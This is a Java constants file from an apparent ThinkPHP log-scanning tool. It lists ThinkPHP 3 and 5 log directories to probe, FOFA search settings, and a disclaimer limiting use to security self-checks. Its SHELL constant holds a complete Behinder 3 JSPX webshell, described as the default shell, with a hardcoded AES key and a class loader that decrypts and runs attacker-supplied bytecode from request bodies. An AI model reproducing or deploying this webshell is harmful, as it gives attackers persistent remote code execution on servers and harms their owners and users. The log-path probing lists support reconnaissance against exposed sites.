package cn.safe6.core;

/**
 * @author yhy
 * @date 2021/3/25 11:20
 * @github https://github.com/yhy0
 * <p>
 * <p>
 * safe6:正常来讲这些常量应该丢到一个接口里面去，而不是放着类里
 */

public interface Constants {
    String NAME = "www.safe6.cn";

    String VERSION = "20210622";

    String METHOD_GET = "GET";

    String METHOD_POST = "POST";

    String AUTHOR = "Safe6Sec";

    String BASICINFO = "本工具提供给安全测试人员,安全工程师,进行安全自查使用,请勿非法使用\r\n\r\n" +
            "版本:     " + VERSION + "\r\n\r\n" +
            "Bug反馈:  https://github.com/safe6Sec/ThinkPHPLogScan\r\n\r\n";




    String[] VER = {
            "tp5",
            "tp3"
    };

    String[] ENCODING = {
            "UTF-8",
            "GBK",
            "GBK2312",
            "ISO-8859-1"
    };

    String[] TP5PATH = {
            "/runtime/log/"

    };
    String[] TP3PATH = {
            "/Runtime/Logs/  ",
                "/App/Runtime/Logs/",
            " /Application/Runtime/Logs/Admin/",
            "/Application/Runtime/Logs/Home/",
            "/Application/Runtime/Logs/App/",
            "/Application/Runtime/Logs/Ext/",
            "/Application/Runtime/Logs/Api/",
            "/Application/Runtime/Logs/Test/",
            "/Application/Runtime/Logs/Common/",
            "/Application/Runtime/Logs/Service/",
            "/Application/Runtime/Logs/"
    };

    // fofa 搜索数
    int[] SIZE = {10, 50, 100, 300, 600, 1000, 10000};
    // fofa配置保存位置
    String FOFAPATH = "fofa.conf";

    // 默认为冰蝎3 的shell.jspx
    String SHELL = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:directive.page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>";


}
